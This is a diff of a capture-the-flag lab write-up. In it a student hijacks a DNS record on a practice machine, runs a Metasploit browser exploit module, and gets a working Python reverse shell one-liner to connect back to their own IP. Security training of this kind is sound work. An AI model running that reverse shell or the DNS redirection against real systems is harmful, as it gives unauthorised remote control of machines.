@@ -1,11 +1,24 @@
 flag{5d402e}: Start DATATIME: Sunday End DATATIME: Tuesday. Total time spend: 3h
-For this flag I just spend lot of time searching for differet ways
-of performing client-side attacks. First I treid to know how to use BeEF
-by installing it and tried to connect to one IP Adress but I didnt managed
-do it so I tried other things. The second thing I tried was using fatrat
-as I found one youtube video that seemed interessting to perform client-side
-attack but at one point I didnt know how to manage using metasploit and fatrat
+For this flag I just spend lot of time searching for differet ways of performing client-side attacks.
+Work without results:
+First I treid to know how to use BeEF by installing it and tried to connect to one IP Adress but I didnt managed
+do it so I tried other things. The second thing I tried was using fatrat as I found one youtube video that seemed 
+interessting to perform client-side attack but at one point I didnt know how to manage using metasploit and fatrat
 at the same time to achive the client-side attack. 
-So after lots of hours searching inside the sea turtle machine I found that maybe 
-I could redirect Redirect one of the ip that is in /etc/php-dns/dns_records.json to
-my personal IP adress of my computer. 
+
+Work with results:
+So after lots of hours searching inside the sea turtle machine I found that maybe I could redirect one of the ip that is 
+in /etc/php-dns/dns_records.json to my personal IP adress of my computer and I typed :
+                                systemctl restart php-dns in sea turtle
+After that I just opened msfconsole in my local machine and typed search webidl to see all the modules aviable and exploit 
+the machine. So after that I put different commands to prepare the machine with different sets such as:
+                                          use 0
+                                          set SRVPORT 80
+                                          set URIPATH 
+                                          set LHOST 192.168.0.6
+And just run to exploit the machine. Before that, I prepared a command for a reverse shell and a listener with netcat.
+After that, returning to the msfconsole I put sessions -i l and then I used the same pyhton script as one of the previous flags 
+to catch incoming requests:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+So then I returned to my reverse shell and I was connected. I just had to use the cd command to different folders and
+had the flag in any of them.
